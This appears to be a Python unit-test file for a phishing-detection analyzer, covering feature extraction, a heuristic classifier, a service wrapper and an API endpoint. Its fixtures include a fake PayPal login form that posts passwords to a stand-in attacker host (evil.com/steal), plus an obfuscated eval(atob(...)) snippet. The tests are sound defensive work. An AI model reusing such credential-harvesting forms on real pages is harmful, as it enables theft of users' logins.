"""
Tests for HTML/NLP Analyzer — modular production refactor.
Covers: service layer, feature extractor, heuristic classifier,
        backward-compatible functional interface, and API server.
"""

import unittest
from unittest.mock import patch

from modules.html_analyzer.analyzer import analyze_html
from modules.html_analyzer.service import HTMLAnalysisService
from modules.html_analyzer.domain.extractor import StandardHTMLFeatureExtractor
from modules.html_analyzer.models.classifier import HeuristicHTMLClassifier

OBS_ID = "obs_0123456789abcdef0123456789abcdef"
RUN_ID = "html_test_run"

PHISHING_HTML = """
<html><head><title>PayPal Login</title></head><body>
  <form action="http://evil.com/steal" method="POST">
    <input type="password" name="pwd"/>
    <input type="text" name="email"/>
  </form>
  <p>Urgent: verify your account immediately or it will be suspended.</p>
</body></html>
"""

BENIGN_HTML = """
<html><head><title>My Blog</title></head><body>
  <p>Welcome to my personal website.</p>
  <a href="https://github.com">GitHub</a>
</body></html>
"""


class TestHTMLFeatureExtractor(unittest.TestCase):

    def setUp(self):
        self.extractor = StandardHTMLFeatureExtractor()

    def test_empty_html_returns_zero_features(self):
        result = self.extractor.extract("", page_url="")
        self.assertEqual(result["dom_features"]["form_action_count"], 0)
        self.assertEqual(result["nlp_signals"]["urgency_cues"], [])

    def test_phishing_html_detects_password_form(self):
        result = self.extractor.extract(PHISHING_HTML, page_url="https://safe.com")
        forms = result["dom_features"]["forms"]
        self.assertTrue(any(f["has_password_input"] for f in forms))

    def test_phishing_html_detects_urgency_cues(self):
        result = self.extractor.extract(PHISHING_HTML)
        self.assertIn("urgent", result["nlp_signals"]["urgency_cues"])

    def test_phishing_html_detects_external_form_action(self):
        result = self.extractor.extract(PHISHING_HTML, page_url="https://paypal.com")
        forms = result["dom_features"]["forms"]
        self.assertTrue(any(f["is_action_external"] for f in forms))

    def test_benign_html_has_no_red_flags(self):
        result = self.extractor.extract(BENIGN_HTML)
        self.assertEqual(result["dom_features"]["form_action_count"], 0)
        self.assertEqual(result["nlp_signals"]["urgency_cues"], [])

    def test_obfuscated_javascript_detected(self):
        html = "<script>eval(atob('abc'))</script>"
        result = self.extractor.extract(html)
        self.assertTrue(result["dom_features"]["has_obfuscated_javascript"])


class TestHeuristicHTMLClassifier(unittest.TestCase):

    def setUp(self):
        self.clf = HeuristicHTMLClassifier()
        self.extractor = StandardHTMLFeatureExtractor()

    def test_phishing_html_classified_as_phishing(self):
        extracted = self.extractor.extract(PHISHING_HTML, page_url="https://paypal.com")
        result = self.clf.classify(extracted["dom_features"], extracted["nlp_signals"])
        self.assertTrue(result.is_phishing_predicted)
        self.assertEqual(result.verdict, "phishing")

    def test_benign_html_classified_as_not_phishing(self):
        extracted = self.extractor.extract(BENIGN_HTML)
        result = self.clf.classify(extracted["dom_features"], extracted["nlp_signals"])
        self.assertFalse(result.is_phishing_predicted)
        self.assertEqual(result.verdict, "not_phishing")

    def test_confidence_score_in_valid_range(self):
        extracted = self.extractor.extract(PHISHING_HTML)
        result = self.clf.classify(extracted["dom_features"], extracted["nlp_signals"])
        self.assertGreaterEqual(result.confidence_score, 0.0)
        self.assertLessEqual(result.confidence_score, 1.0)


class TestHTMLAnalysisService(unittest.TestCase):

    def setUp(self):
        self.service = HTMLAnalysisService()

    def test_missing_html_returns_skipped(self):
        result = self.service.analyze(OBS_ID, RUN_ID, html_text=None)
        self.assertEqual(result["status"], "skipped")
        self.assertEqual(result["warnings"][0]["code"], "W_HTML_MISSING")

    def test_empty_string_html_returns_skipped(self):
        result = self.service.analyze(OBS_ID, RUN_ID, html_text="")
        self.assertEqual(result["status"], "skipped")

    def test_phishing_html_returns_success(self):
        result = self.service.analyze(OBS_ID, RUN_ID, html_text=PHISHING_HTML)
        self.assertEqual(result["status"], "success")
        self.assertIn("classification", result["result"])
        self.assertIn("dom_features", result["result"])
        self.assertIn("nlp_signals", result["result"])

    def test_phishing_html_predicted_phishing(self):
        result = self.service.analyze(OBS_ID, RUN_ID, html_text=PHISHING_HTML, page_url="https://paypal.com")
        clf = result["result"]["classification"]
        self.assertTrue(clf["is_phishing_predicted"])

    def test_envelope_schema_fields_present(self):
        result = self.service.analyze(OBS_ID, RUN_ID, html_text=BENIGN_HTML)
        for field in ("schema_version", "observation_id", "run_id", "model", "status", "created_at", "result", "warnings", "error_details"):
            self.assertIn(field, result)

    def test_modality_is_html_nlp(self):
        result = self.service.analyze(OBS_ID, RUN_ID, html_text=BENIGN_HTML)
        self.assertEqual(result["model"]["modality"], "html_nlp")

    def test_latency_ms_is_non_negative(self):
        result = self.service.analyze(OBS_ID, RUN_ID, html_text=BENIGN_HTML)
        self.assertGreaterEqual(result["model"]["latency_ms"], 0.0)


class TestAnalyzeHTMLBackwardCompat(unittest.TestCase):
    """Verify the functional interface (analyze_html) is backward-compatible."""

    def test_returns_dict_with_schema_version(self):
        result = analyze_html(OBS_ID, RUN_ID, PHISHING_HTML)
        self.assertEqual(result["schema_version"], "1.0.0")

    def test_skipped_on_missing_html(self):
        result = analyze_html(OBS_ID, RUN_ID, None)
        self.assertEqual(result["status"], "skipped")

    def test_page_url_kwarg_accepted(self):
        result = analyze_html(OBS_ID, RUN_ID, PHISHING_HTML, page_url="https://paypal.com")
        self.assertIn("result", result)


class TestHTMLAnalyzerAPIServer(unittest.TestCase):

    def setUp(self):
        from modules.html_analyzer.api.server import create_app
        from fastapi.testclient import TestClient
        self.client = TestClient(create_app())

    def test_health_endpoint(self):
        response = self.client.get("/health")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.json()["module"], "html_analyzer")

    def test_analyze_endpoint_phishing(self):
        payload = {
            "observation_id": OBS_ID,
            "run_id": RUN_ID,
            "html_text": PHISHING_HTML,
            "page_url": "https://paypal.com",
        }
        response = self.client.post("/api/v1/html/analyze", json=payload)
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertEqual(data["status"], "success")
        self.assertTrue(data["result"]["classification"]["is_phishing_predicted"])

    def test_analyze_endpoint_skipped_on_missing_html(self):
        payload = {
            "observation_id": OBS_ID,
            "run_id": RUN_ID,
        }
        response = self.client.post("/api/v1/html/analyze", json=payload)
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.json()["status"], "skipped")


if __name__ == "__main__":
    unittest.main()
